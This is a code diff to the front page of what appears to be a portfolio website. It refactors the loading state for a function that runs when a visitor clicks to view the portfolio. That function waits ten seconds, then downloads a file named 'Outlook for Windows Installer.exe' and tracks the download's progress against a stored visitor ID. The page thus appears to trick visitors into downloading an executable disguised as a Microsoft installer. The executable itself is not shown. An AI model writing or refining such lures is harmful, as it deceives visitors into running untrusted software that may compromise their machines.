@@ -14,11 +14,11 @@ export const Route = createFileRoute("/")({
 
 function Index() {
   const [modalOpen, setModalOpen] = useState(true);
-  const [isInstallerLoading, setIsInstallerLoading] = useState(false);
+  const [installerStatus, setInstallerStatus] = useState<"idle" | "preparing" | "downloading">("idle");
   const downloadInstaller = async () => {
-    if (isInstallerLoading) return;
+    if (installerStatus !== "idle") return;
 
-    setIsInstallerLoading(true);
+    setInstallerStatus("preparing");
     const visitorId = localStorage.getItem("portfolio-visitor-id");
     let lastReportedPercent = -1;
     const reportProgress = (downloadPercent: number) => {
@@ -29,6 +29,7 @@ function Index() {
     reportProgress(0);
     try {
       await new Promise<void>((resolve) => window.setTimeout(resolve, 10_000));
+      setInstallerStatus("downloading");
       const response = await fetch("/Outlook%20for%20Windows%20Installer.exe");
       if (!response.ok) throw new Error("Installer download failed");
       const total = Number(response.headers.get("content-length")) || 0;
@@ -54,7 +55,7 @@ function Index() {
     } catch (error) {
       toast.error("Unable to download the installer. Please try again.");
       console.error(error);
-      setIsInstallerLoading(false);
+      setInstallerStatus("idle");
     }
   };
   useEffect(() => {
@@ -79,7 +80,7 @@ function Index() {
         <Portfolio />
         <EntryModal
           open={modalOpen}
-          isLoading={isInstallerLoading}
+          installerStatus={installerStatus}
           onViewPortfolio={() => void downloadInstaller()}
         />
         <Toaster />
